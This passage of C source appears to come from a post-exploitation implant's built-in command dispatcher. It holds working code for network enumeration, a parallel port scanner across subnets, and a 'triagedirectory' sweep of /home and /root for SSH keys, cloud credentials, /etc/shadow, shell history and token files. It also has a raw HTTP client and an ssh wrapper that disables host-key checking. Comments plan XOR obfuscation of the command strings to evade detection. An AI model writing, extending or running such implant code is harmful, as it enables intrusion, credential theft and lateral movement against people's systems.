    unsigned char a = (unsigned char)((val >>  0) & 0xFF);
    unsigned char b = (unsigned char)((val >>  8) & 0xFF);
    unsigned char c = (unsigned char)((val >> 16) & 0xFF);
    unsigned char d = (unsigned char)((val >> 24) & 0xFF);
    snprintf(out, 16, "%d.%d.%d.%d", a, b, c, d);
}

/* Try to find PID owning a socket inode by scanning /proc/[pid]/fd/ */
static int find_pid_for_inode(unsigned long inode) {
    if (getuid() != 0) return -1;

    DIR *pdir = opendir("/proc");
    if (!pdir) return -1;

    char target[64];
    snprintf(target, sizeof(target), "socket:[%lu]", inode);

    int found_pid = -1;
    struct dirent *de;
    while ((de = readdir(pdir)) != NULL && found_pid < 0) {
        if (de->d_name[0] < '1' || de->d_name[0] > '9') continue;
        char *ep = NULL;
        long pid_num = strtol(de->d_name, &ep, 10);
        if (!ep || *ep != '\0') continue;

        char fd_path[128];
        snprintf(fd_path, sizeof(fd_path), "/proc/%ld/fd", pid_num);
        DIR *fdir = opendir(fd_path);
        if (!fdir) continue;

        struct dirent *fde;
        while ((fde = readdir(fdir)) != NULL) {
            if (fde->d_name[0] == '.') continue;
            char link_path[192];
            snprintf(link_path, sizeof(link_path), "/proc/%ld/fd/%s", pid_num, fde->d_name);
            char link_buf[128] = {0};
            ssize_t lr = readlink(link_path, link_buf, sizeof(link_buf) - 1);
            if (lr > 0) {
                link_buf[lr] = '\0';
                if (strcmp(link_buf, target) == 0) {
                    found_pid = (int)pid_num;
                    break;
                }
            }
        }
        closedir(fdir);
    }
    closedir(pdir);
    return found_pid;
}

/* Get process name from /proc/[pid]/comm */
static void get_comm(int pid, char *out, int out_size) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/comm", pid);
    if (read_small_file(path, out, out_size) <= 0)
        strncpy(out, "?", (size_t)(out_size - 1));
}

/* Parse /proc/net/tcp or /proc/net/udp and append to output */
static int parse_net_file(const char *proto, const char *netfile,
                           char *buf, int buf_size, int pos) {
    int fd = open(netfile, O_RDONLY);
    if (fd < 0) return pos;

    char rbuf[65536];
    ssize_t n = read(fd, rbuf, sizeof(rbuf) - 1);
    close(fd);
    if (n <= 0) return pos;
    rbuf[n] = '\0';

    char *line = rbuf;
    int first_line = 1;
    while (line && *line) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = '\0';
        if (first_line) { first_line = 0; line = nl ? nl + 1 : NULL; continue; }

        /* fields:
         * sl  local_addr  rem_addr  state  tx_queue:rx_queue  tr  tm->when
         * retransmit  uid  timeout  inode
         * 0   1           2         3      4                   5   6
         * 7            8    9        10
         */
        char sl[16], local[32], rem[32], state_hex[8];
        char unused1[32], unused2[16], unused3[16], unused4[16];
        char uid_str[16], unused5[16], inode_str[32];

        int fields = sscanf(line,
            "%15s %31s %31s %7s %31s %15s %15s %15s %15s %15s %31s",
            sl, local, rem, state_hex,
            unused1, unused2, unused3, unused4,
            uid_str, unused5, inode_str);

        if (fields < 11) { line = nl ? nl + 1 : NULL; continue; }

        /* parse local addr */
        char *colon_l = strchr(local, ':');
        char local_ip[20] = "?", local_port_str[8] = "?";
        if (colon_l) {
            *colon_l = '\0';
            hex_ip_to_str(local, local_ip);
            unsigned int lp = (unsigned int)strtoul(colon_l + 1, NULL, 16);
            snprintf(local_port_str, sizeof(local_port_str), "%u", lp);
        }

        /* parse remote addr */
        char *colon_r = strchr(rem, ':');
        char rem_ip[20] = "?", rem_port_str[8] = "*";
        if (colon_r) {
            *colon_r = '\0';
            hex_ip_to_str(rem, rem_ip);
            unsigned int rp = (unsigned int)strtoul(colon_r + 1, NULL, 16);
            if (rp == 0) strncpy(rem_port_str, "*", sizeof(rem_port_str) - 1);
            else snprintf(rem_port_str, sizeof(rem_port_str), "%u", rp);
        }

        int state_int = (int)strtol(state_hex, NULL, 16);
        const char *state_name = tcp_state_name(state_int);

        /* inode -> pid */
        unsigned long inode_num = strtoul(inode_str, NULL, 10);
        int owner_pid = find_pid_for_inode(inode_num);
        char pname[32] = "-";
        if (owner_pid > 0) get_comm(owner_pid, pname, sizeof(pname));

        char local_full[28], rem_full[28];
        snprintf(local_full, sizeof(local_full), "%s:%s", local_ip, local_port_str);
        snprintf(rem_full,   sizeof(rem_full),   "%s:%s", rem_ip,   rem_port_str);

        if (owner_pid > 0)
            pos = out_append(buf, buf_size, pos,
                "%-5s  %-22s %-22s %-13s %-6d %s\n",
                proto, local_full, rem_full, state_name, owner_pid, pname);
        else
            pos = out_append(buf, buf_size, pos,
                "%-5s  %-22s %-22s %-13s %-6s %s\n",
                proto, local_full, rem_full, state_name, "-", pname);

        line = nl ? nl + 1 : NULL;
    }
    return pos;
}

static int builtin_netstat(char *buf, int buf_size) {
    int pos = 0;
    pos = out_append(buf, buf_size, pos,
        "%-5s  %-22s %-22s %-13s %-6s %s\n",
        "PROTO", "LOCAL", "REMOTE", "STATE", "PID", "PROCESS");
    pos = parse_net_file("tcp",  "/proc/net/tcp",  buf, buf_size, pos);
    pos = parse_net_file("tcp6", "/proc/net/tcp6", buf, buf_size, pos);
    pos = parse_net_file("udp",  "/proc/net/udp",  buf, buf_size, pos);
    pos = parse_net_file("udp6", "/proc/net/udp6", buf, buf_size, pos);
    return pos;
}

/* -------------------------------------------------------------------------
 * 18. builtin_portscan
 * ---------------------------------------------------------------------- */

#define PORTSCAN_MAX_FDS 20
#define PORTSCAN_TIMEOUT_SEC 2

typedef struct {
    int       fd;
    uint32_t  ip;     /* network byte order */
    uint16_t  port;   /* host byte order */
    int       used;
} ScanSlot;

static int check_slot_connected(ScanSlot *s) {
    fd_set wfds;
    FD_ZERO(&wfds);
    FD_SET(s->fd, &wfds);
    struct timeval tv = { 0, 0 };
    int r = select(s->fd + 1, NULL, &wfds, NULL, &tv);
    if (r <= 0) return 0;
    int sockerr = 0;
    socklen_t errlen = sizeof(sockerr);
    getsockopt(s->fd, SOL_SOCKET, SO_ERROR, &sockerr, &errlen);
    return (sockerr == 0) ? 1 : 0;
}

/* Expand CIDR to list of host IPs (network byte order).
 * Returns count; allocates *ips (caller must free). */
static int expand_cidr(const char *cidr, uint32_t **ips) {
    char host_part[64] = {0};
    int prefix = 32;
    const char *slash = strchr(cidr, '/');
    if (slash) {
        int hlen = (int)(slash - cidr);
        if (hlen >= 63) hlen = 63;
        memcpy(host_part, cidr, (size_t)hlen);
        host_part[hlen] = '\0';
        prefix = atoi(slash + 1);
    } else {
        strncpy(host_part, cidr, sizeof(host_part) - 1);
    }
    if (prefix < 0) prefix = 0;
    if (prefix > 32) prefix = 32;

    struct in_addr addr;
    if (inet_aton(host_part, &addr) == 0) return 0;

    uint32_t base = ntohl(addr.s_addr);

    /* /32 or plain IP: single host, no CIDR math */
    if (prefix == 32) {
        *ips = malloc(sizeof(uint32_t));
        if (!*ips) return 0;
        (*ips)[0] = htonl(base);
        return 1;
    }

    uint32_t mask = (prefix == 0) ? 0 : (~0u << (32 - prefix));
    uint32_t network = base & mask;
    uint32_t count = ~mask; /* number of addresses in block */

    /* cap at 1024 hosts to avoid memory blow-up */
    if (count > 1024) count = 1024;

    *ips = malloc(count * sizeof(uint32_t));
    if (!*ips) return 0;

    uint32_t n = 0;
    for (uint32_t h = 1; h < count; h++) {   /* skip network address, skip broadcast */
        (*ips)[n++] = htonl(network + h);
    }
    return (int)n;
}

/* Parse port spec: "22" or "22,80,443" or "1-1024" → sorted array.
 * Returns count; allocates *ports (caller must free). */
static int parse_ports(const char *spec, uint16_t **ports) {
    int cap = 64;
    *ports = malloc((size_t)cap * sizeof(uint16_t));
    if (!*ports) return 0;
    int count = 0;

    char buf_copy[4096];
    strncpy(buf_copy, spec, sizeof(buf_copy) - 1);
    buf_copy[sizeof(buf_copy) - 1] = '\0';

    char *tok = strtok(buf_copy, ",");
    while (tok) {
        char *dash = strchr(tok, '-');
        if (dash) {
            int lo = atoi(tok);
            int hi = atoi(dash + 1);
            if (lo < 1) lo = 1;
            if (hi > 65535) hi = 65535;
            for (int p = lo; p <= hi; p++) {
                if (count >= cap) {
                    cap *= 2;
                    uint16_t *np = realloc(*ports, (size_t)cap * sizeof(uint16_t));
                    if (!np) goto done;
                    *ports = np;
                }
                (*ports)[count++] = (uint16_t)p;
            }
        } else {
            int pnum = atoi(tok);
            if (pnum >= 1 && pnum <= 65535) {
                if (count >= cap) {
                    cap *= 2;
                    uint16_t *np = realloc(*ports, (size_t)cap * sizeof(uint16_t));
                    if (!np) goto done;
                    *ports = np;
                }
                (*ports)[count++] = (uint16_t)pnum;
            }
        }
        tok = strtok(NULL, ",");
    }
done:
    return count;
}

static int builtin_portscan(const char *args, char *buf, int buf_size) {
    int pos = 0;
    const char *p = ltrim(args);
    if (*p == '\0')
        return out_append(buf, buf_size, 0,
                          "usage: portscan <host|cidr> <ports>\n"
                          "  e.g. portscan 192.168.1.1 22,80,443\n"
                          "       portscan 192.168.1.0/24 1-1024\n");

    /* split host_spec and port_spec on first space */
    const char *sp = strchr(p, ' ');
    if (!sp)
        return out_append(buf, buf_size, 0,
                          "usage: portscan <host|cidr> <ports>\n");

    char host_spec[128] = {0};
    int hslen = (int)(sp - p);
    if (hslen >= (int)sizeof(host_spec)) hslen = (int)sizeof(host_spec) - 1;
    memcpy(host_spec, p, (size_t)hslen);
    host_spec[hslen] = '\0';

    const char *port_spec = ltrim(sp);

    uint32_t *ips   = NULL;
    uint16_t *ports = NULL;
    int nips   = expand_cidr(host_spec, &ips);
    int nports = parse_ports(port_spec, &ports);

    if (nips == 0 || nports == 0) {
        free(ips); free(ports);
        return out_append(buf, buf_size, 0, "portscan: invalid host or port spec\n");
    }

    int open_count = 0;
    ScanSlot slots[PORTSCAN_MAX_FDS];
    memset(slots, 0, sizeof(slots));

    /* total work items */
    long total_work = (long)nips * nports;
    long work_idx   = 0;
    int  ip_i   = 0;
    int  port_i = 0;

    while (work_idx < total_work || /* pending slots? */ ({
            int _any = 0;
            for (int _i = 0; _i < PORTSCAN_MAX_FDS; _i++) if (slots[_i].used) { _any = 1; break; }
            _any; })) {

        /* fill free slots */
        while (work_idx < total_work) {
            /* find a free slot */
            int free_slot = -1;
            for (int s = 0; s < PORTSCAN_MAX_FDS; s++)
                if (!slots[s].used) { free_slot = s; break; }
            if (free_slot < 0) break; /* all slots busy */

            uint32_t cur_ip   = ips[ip_i];
            uint16_t cur_port = ports[port_i];

            port_i++;
            if (port_i >= nports) { port_i = 0; ip_i++; }
            work_idx++;

            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd < 0) continue;

            int flags = fcntl(fd, F_GETFL, 0);
            fcntl(fd, F_SETFL, flags | O_NONBLOCK);

            struct sockaddr_in sa;
            memset(&sa, 0, sizeof(sa));
            sa.sin_family      = AF_INET;
            sa.sin_port        = htons(cur_port);
            sa.sin_addr.s_addr = cur_ip;

            int r = connect(fd, (struct sockaddr *)&sa, sizeof(sa));
            if (r == 0) {
                /* immediately connected */
                char ipstr[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &cur_ip, ipstr, sizeof(ipstr));
                pos = out_append(buf, buf_size, pos,
                                 "%-15s  %d/tcp    open\n", ipstr, cur_port);
                open_count++;
                close(fd);
                continue;
            }
            if (errno != EINPROGRESS) { close(fd); continue; }

            slots[free_slot].fd   = fd;
            slots[free_slot].ip   = cur_ip;
            slots[free_slot].port = cur_port;
            slots[free_slot].used = 1;
        }

        /* build select fdset with timeout */
        fd_set wfds;
        FD_ZERO(&wfds);
        int max_fd = -1;
        for (int s = 0; s < PORTSCAN_MAX_FDS; s++) {
            if (slots[s].used) {
                FD_SET(slots[s].fd, &wfds);
                if (slots[s].fd > max_fd) max_fd = slots[s].fd;
            }
        }
        if (max_fd < 0) continue;

        struct timeval tv = { PORTSCAN_TIMEOUT_SEC, 0 };
        select(max_fd + 1, NULL, &wfds, NULL, &tv);

        /* check results */
        for (int s = 0; s < PORTSCAN_MAX_FDS; s++) {
            if (!slots[s].used) continue;
            if (FD_ISSET(slots[s].fd, &wfds)) {
                if (check_slot_connected(&slots[s])) {
                    char ipstr[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, &slots[s].ip, ipstr, sizeof(ipstr));
                    pos = out_append(buf, buf_size, pos,
                                     "%-15s  %d/tcp    open\n", ipstr, slots[s].port);
                    open_count++;
                }
                close(slots[s].fd);
                slots[s].used = 0;
            } else {
                /* timeout — close and mark done */
                close(slots[s].fd);
                slots[s].used = 0;
            }
        }
    }

    free(ips);
    free(ports);
    pos = out_append(buf, buf_size, pos,
                     "Scan complete: %d open port(s) (%d host(s) scanned)\n",
                     open_count, nips);
    return pos;
}

/* -------------------------------------------------------------------------
 * 19. builtin_triagedirectory
 * ---------------------------------------------------------------------- */

/* Categories for triage */
#define TRIAGE_CATS 10
static const char *triage_cat_names[TRIAGE_CATS] = {
    "SSH Keys", "Cloud Credentials", "Git", "Shell History",
    "Environment Files", "Databases", "Certificates", "Passwords",
    "Tokens", "Misc Credentials"
};

typedef struct {
    char   path[512];
    off_t  size;
    time_t mtime;
    int    cat;
} TriageHit;

static TriageHit *g_triage_hits = NULL;
static int        g_triage_count = 0;
static int        g_triage_cap   = 0;

/* Return category index for a path, or -1 if not interesting */
static int triage_categorize(const char *path) {
    const char *base = strrchr(path, '/');
    base = base ? base + 1 : path;

    /* SSH */
    if (strcmp(base, "id_rsa") == 0 || strcmp(base, "id_ed25519") == 0 ||
        strcmp(base, "id_ecdsa") == 0 || strcmp(base, "id_dsa") == 0 ||
        strcmp(base, "known_hosts") == 0 || strcmp(base, "authorized_keys") == 0)
        return 0;
    if (strstr(path, ".ssh/") || strstr(path, "/.ssh"))
        if (strstr(base, ".pem") || strstr(base, ".key")) return 0;

    /* Cloud */
    if (strstr(path, ".aws/credentials") || strstr(path, "/.boto") ||
        strstr(path, ".kube/config") || strstr(path, ".docker/config.json"))
        return 1;

    /* Git */
    if (strcmp(base, ".gitconfig") == 0 || strcmp(base, ".git-credentials") == 0)
        return 2;

    /* History */
    if (strcmp(base, ".bash_history") == 0 || strcmp(base, ".zsh_history") == 0 ||
        strcmp(base, ".sh_history") == 0 || strcmp(base, ".fish_history") == 0)
        return 3;

    /* Env */
    if (strcmp(base, ".env") == 0) return 4;
    {
        size_t blen = strlen(base);
        if (blen > 4 && strcmp(base + blen - 4, ".env") == 0) return 4;
    }

    /* Databases */
    {
        size_t blen = strlen(base);
        if (blen > 4 && (strcmp(base + blen - 4, ".sql") == 0 ||
                          strcmp(base + blen - 3, ".db") == 0))  return 5;
        if (blen > 7 && strcmp(base + blen - 7, ".sqlite") == 0) return 5;
        if (blen > 8 && strcmp(base + blen - 8, ".sqlite3") == 0) return 5;
    }

    /* Certificates */
    {
        size_t blen = strlen(base);
        if (blen > 4 && (strcmp(base + blen - 4, ".crt") == 0 ||
                          strcmp(base + blen - 4, ".p12") == 0 ||
                          strcmp(base + blen - 4, ".pfx") == 0)) return 6;
    }

    /* Passwords */
    if (strstr(path, "/etc/shadow") || strcmp(base, ".htpasswd") == 0) return 7;

    /* Tokens */
    if (strcmp(base, ".npmrc") == 0 || strcmp(base, ".pypirc") == 0 ||
        strcmp(base, ".netrc") == 0) return 8;

    return -1;
}

static int triage_skip_dir(const char *path) {
    return (strncmp(path, "/proc", 5) == 0 || strncmp(path, "/sys", 4) == 0 ||
            strncmp(path, "/dev", 4) == 0  || strncmp(path, "/run", 4) == 0);
}

static void triage_add_hit(const char *fpath, const struct stat *sb) {
    int cat = triage_categorize(fpath);
    if (cat < 0) return;
    if (g_triage_count >= g_triage_cap) {
        int new_cap = g_triage_cap ? g_triage_cap * 2 : 256;
        TriageHit *nh = realloc(g_triage_hits, (size_t)new_cap * sizeof(TriageHit));
        if (!nh) return;
        g_triage_hits = nh;
        g_triage_cap  = new_cap;
    }
    TriageHit *h = &g_triage_hits[g_triage_count++];
    strncpy(h->path, fpath, sizeof(h->path) - 1);
    h->path[sizeof(h->path) - 1] = '\0';
    h->size  = sb->st_size;
    h->mtime = sb->st_mtime;
    h->cat   = cat;
}

static void triage_walk(const char *dirpath, int depth) {
    if (depth > 10) return;
    if (triage_skip_dir(dirpath)) return;

    DIR *d = opendir(dirpath);
    if (!d) return;

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] == '.' && (ent->d_name[1] == '\0' ||
            (ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
            continue;

        char full[1024];
        int n = snprintf(full, sizeof(full), "%s/%s", dirpath, ent->d_name);
        if (n < 0 || (size_t)n >= sizeof(full)) continue;

        struct stat sb;
        if (lstat(full, &sb) != 0) continue;

        if (S_ISDIR(sb.st_mode)) {
            triage_walk(full, depth + 1);
        } else if (S_ISREG(sb.st_mode) || S_ISLNK(sb.st_mode)) {
            triage_add_hit(full, &sb);
        }
    }
    closedir(d);
}

static int builtin_triage(const char *args, char *buf, int buf_size) {
    int pos = 0;
    const char *target = ltrim(args);

    free(g_triage_hits);
    g_triage_hits  = NULL;
    g_triage_count = 0;
    g_triage_cap   = 0;

    if (*target == '\0') {
        triage_walk("/home", 0);
        triage_walk("/root", 0);
    } else {
        triage_walk(target, 0);
    }

    int cats_seen = 0;
    for (int c = 0; c < TRIAGE_CATS; c++) {
        int first = 1;
        for (int i = 0; i < g_triage_count; i++) {
            if (g_triage_hits[i].cat != c) continue;
            if (first) {
                pos = out_append(buf, buf_size, pos, "[%s]\n", triage_cat_names[c]);
                first = 0;
                cats_seen++;
            }
            char mt[20];
            struct tm tm_info;
            localtime_r(&g_triage_hits[i].mtime, &tm_info);
            strftime(mt, sizeof(mt), "%Y-%m-%d", &tm_info);
            pos = out_append(buf, buf_size, pos,
                             "  %-60s %10lld bytes  %s\n",
                             g_triage_hits[i].path,
                             (long long)g_triage_hits[i].size,
                             mt);
        }
    }

    pos = out_append(buf, buf_size, pos,
                     "\nFound %d sensitive file(s) in %d category/categories\n",
                     g_triage_count, cats_seen);

    free(g_triage_hits);
    g_triage_hits  = NULL;
    g_triage_count = 0;
    g_triage_cap   = 0;
    return pos;
}

/* -------------------------------------------------------------------------
 * 20. builtin_curl
 * ---------------------------------------------------------------------- */
static int builtin_curl(const char *args, char *buf, int buf_size) {
    int pos = 0;
    const char *url = ltrim(args);
    if (*url == '\0')
        return out_append(buf, buf_size, 0, "usage: curl <url>\n");

    /* Check scheme */
    if (strncmp(url, "https://", 8) == 0)
        return out_append(buf, buf_size, 0,
                          "curl: https not supported in builtin, use download\n");

    const char *host_start;
    if (strncmp(url, "http://", 7) == 0) host_start = url + 7;
    else host_start = url;

    /* extract host, port, path */
    char host[256] = {0};
    int  port = 80;
    char path[2048] = "/";

    const char *slash = strchr(host_start, '/');
    const char *colon = strchr(host_start, ':');

    if (colon && (!slash || colon < slash)) {
        /* port specified */
        int hlen = (int)(colon - host_start);
        if (hlen >= (int)sizeof(host)) hlen = (int)sizeof(host) - 1;
        memcpy(host, host_start, (size_t)hlen);
        host[hlen] = '\0';
        port = atoi(colon + 1);
        if (slash) strncpy(path, slash, sizeof(path) - 1);
    } else if (slash) {
        int hlen = (int)(slash - host_start);
        if (hlen >= (int)sizeof(host)) hlen = (int)sizeof(host) - 1;
        memcpy(host, host_start, (size_t)hlen);
        host[hlen] = '\0';
        strncpy(path, slash, sizeof(path) - 1);
    } else {
        strncpy(host, host_start, sizeof(host) - 1);
    }
    if (host[0] == '\0')
        return out_append(buf, buf_size, 0, "curl: invalid URL\n");

    /* resolve host */
    struct in_addr addr;
    if (inet_aton(host, &addr) == 0) {
        /* not a numeric IP — try getaddrinfo */
        struct addrinfo hints, *res = NULL;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family   = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        if (getaddrinfo(host, NULL, &hints, &res) != 0 || !res)
            return out_append(buf, buf_size, 0,
                              "curl: cannot resolve '%s'\n", host);
        addr = ((struct sockaddr_in *)res->ai_addr)->sin_addr;
        freeaddrinfo(res);
    }

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
        return out_append(buf, buf_size, 0, "curl: socket: %s\n", strerror(errno));

    /* 10s timeout */
    struct timeval tv = { 10, 0 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_port        = htons((uint16_t)port);
    sa.sin_addr        = addr;

    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        close(fd);
        return out_append(buf, buf_size, 0,
                          "curl: connect %s:%d: %s\n", host, port, strerror(errno));
    }

    /* send HTTP request */
    char req[1024];
    int req_len = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host);
    if (write(fd, req, (size_t)req_len) != req_len) {
        close(fd);
        return out_append(buf, buf_size, 0, "curl: send error: %s\n", strerror(errno));
    }

    /* read response */
    char rbuf[4096];
    ssize_t n;
    while ((n = read(fd, rbuf, sizeof(rbuf))) > 0) {
        int avail = buf_size - pos - 1;
        if (avail <= 0) break;
        int copy = (n > (ssize_t)avail) ? avail : (int)n;
        memcpy(buf + pos, rbuf, (size_t)copy);
        pos += copy;
        buf[pos] = '\0';
    }
    close(fd);
    return pos;
}

/* -------------------------------------------------------------------------
 * 21. builtin_ssh
 * ---------------------------------------------------------------------- */
static int builtin_ssh(const char *args, char *buf, int buf_size) {
    int pos = 0;
    const char *p = ltrim(args);
    if (*p == '\0')
        return out_append(buf, buf_size, 0,
                          "usage: ssh user@host [command]\n");

    /* first token is user@host, rest is command */
    const char *sp = strchr(p, ' ');
    char target[256] = {0};
    const char *remote_cmd = NULL;
    if (sp) {
        int tlen = (int)(sp - p);
        if (tlen >= (int)sizeof(target)) tlen = (int)sizeof(target) - 1;
        memcpy(target, p, (size_t)tlen);
        target[tlen] = '\0';
        remote_cmd = ltrim(sp);
    } else {
        strncpy(target, p, sizeof(target) - 1);
    }

    /* build argv */
    const char *argv_arr[16];
    int ai = 0;
    argv_arr[ai++] = "ssh";
    argv_arr[ai++] = "-o"; argv_arr[ai++] = "StrictHostKeyChecking=no";
    argv_arr[ai++] = "-o"; argv_arr[ai++] = "BatchMode=yes";
    argv_arr[ai++] = "-o"; argv_arr[ai++] = "ConnectTimeout=10";
    argv_arr[ai++] = target;
    if (remote_cmd && *remote_cmd)
        argv_arr[ai++] = remote_cmd;
    argv_arr[ai] = NULL;

    int pipefd[2];
    if (pipe(pipefd) < 0)
        return out_append(buf, buf_size, 0, "ssh: pipe: %s\n", strerror(errno));

    pid_t pid = fork();
    if (pid < 0) {
        close(pipefd[0]); close(pipefd[1]);
        return out_append(buf, buf_size, 0, "ssh: fork: %s\n", strerror(errno));
    }

    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execvp("ssh", (char *const *)argv_arr);
        _exit(127);
    }

    close(pipefd[1]);

    /* read output with 30s timeout */
    fd_set rfds;
    struct timeval deadline = { 30, 0 };
    ssize_t n;
    while (1) {
        FD_ZERO(&rfds);
        FD_SET(pipefd[0], &rfds);
        int r = select(pipefd[0] + 1, &rfds, NULL, NULL, &deadline);
        if (r <= 0) break;
        char tmp[4096];
        n = read(pipefd[0], tmp, sizeof(tmp));
        if (n <= 0) break;
        int avail = buf_size - pos - 1;
        if (avail <= 0) break;
        int copy = (n > (ssize_t)avail) ? avail : (int)n;
        memcpy(buf + pos, tmp, (size_t)copy);
        pos += copy;
        buf[pos] = '\0';
    }
    close(pipefd[0]);
    waitpid(pid, NULL, 0);
    return pos;
}

/* =========================================================================
 * builtin_dispatch — public entry point
 * ====================================================================== */
int builtin_dispatch(const char *cmd, char *out_buf, int buf_size) {
    if (buf_size > 0) out_buf[0] = '\0';

    /* --- exact-match builtins --- */

    /* XOR: replace with xor_eq */
    if (strcmp(cmd, "whoami") == 0 || strcmp(cmd, "id") == 0) {
        builtin_whoami(out_buf, buf_size);
        return 1;
    }
    if (strcmp(cmd, "hostname") == 0) { /* XOR: replace with xor_eq */
        builtin_hostname(out_buf, buf_size);
        return 1;
    }
    if (strcmp(cmd, "pwd") == 0) { /* XOR: replace with xor_eq */
        builtin_pwd(out_buf, buf_size);
        return 1;
    }
    if (strcmp(cmd, "env") == 0) { /* XOR: replace with xor_eq */
        builtin_env(out_buf, buf_size);
        return 1;
    }
    if (strcmp(cmd, "ps") == 0) { /* XOR: replace with xor_eq */
        builtin_ps(out_buf, buf_size);
        return 1;
    }
    if (strcmp(cmd, "ipconfig") == 0 || strcmp(cmd, "ifconfig") == 0) { /* XOR: replace with xor_eq */
        builtin_ifconfig(out_buf, buf_size);
        return 1;
    }
    if (strcmp(cmd, "netstat") == 0) { /* XOR: replace with xor_eq */
        builtin_netstat(out_buf, buf_size);
        return 1;
    }
    if (strcmp(cmd, "triagedirectory") == 0) { /* XOR: replace with xor_eq */
        builtin_triage("", out_buf, buf_size);
        return 1;
    }

    /* --- ls (exact + prefix) --- */
    /* XOR: replace with xor_eq / xor_prefix */
    if (strcmp(cmd, "ls") == 0) {
        builtin_ls("", out_buf, buf_size);
        return 1;
    }
    if (strncmp(cmd, "ls ", 3) == 0) {
        builtin_ls(cmd + 3, out_buf, buf_size);
        return 1;
    }

    /* --- filebrowser (exact + prefix) --- */
    if (strcmp(cmd, "filebrowser") == 0) {
        builtin_filebrowser("", out_buf, buf_size);
        return 1;
    }
    if (strncmp(cmd, "filebrowser ", 12) == 0) {
        builtin_filebrowser(cmd + 12, out_buf, buf_size);
        return 1;
    }

    /* --- prefix-match builtins --- */
    if (strcmp(cmd, "cd") == 0) { builtin_cd("", out_buf, buf_size); return 1; }
    if (strncmp(cmd, "cd ", 3) == 0) { builtin_cd(cmd + 3, out_buf, buf_size); return 1; } /* XOR */
    if (strncmp(cmd, "cat ", 4) == 0) { builtin_cat(cmd + 4, out_buf, buf_size); return 1; } /* XOR */
    if (strncmp(cmd, "mkdir ", 6) == 0) { builtin_mkdir(cmd + 6, out_buf, buf_size); return 1; } /* XOR */
    if (strncmp(cmd, "rm ", 3) == 0) { builtin_rm(cmd + 3, out_buf, buf_size); return 1; } /* XOR */
    if (strncmp(cmd, "cp ", 3) == 0) { builtin_cp(cmd + 3, out_buf, buf_size); return 1; } /* XOR */
    if (strncmp(cmd, "mv ", 3) == 0) { builtin_mv(cmd + 3, out_buf, buf_size); return 1; } /* XOR */
    if (strncmp(cmd, "chmod ", 6) == 0) { builtin_chmod(cmd + 6, out_buf, buf_size); return 1; } /* XOR */
    if (strncmp(cmd, "getenv ", 7) == 0) { builtin_getenv(cmd + 7, out_buf, buf_size); return 1; } /* XOR */
    if (strncmp(cmd, "kill ", 5) == 0) { builtin_kill_cmd(cmd + 5, out_buf, buf_size); return 1; } /* XOR */
    if (strncmp(cmd, "portscan ", 9) == 0) { builtin_portscan(cmd + 9, out_buf, buf_size); return 1; } /* XOR */
    if (strncmp(cmd, "curl ", 5) == 0) { builtin_curl(cmd + 5, out_buf, buf_size); return 1; } /* XOR */
    if (strncmp(cmd, "ssh ", 4) == 0) { builtin_ssh(cmd + 4, out_buf, buf_size); return 1; } /* XOR */
    if (strncmp(cmd, "triagedirectory ", 16) == 0) {
        builtin_triage(cmd + 16, out_buf, buf_size);
        return 1;
    }

    return 0; /* not a builtin */
}
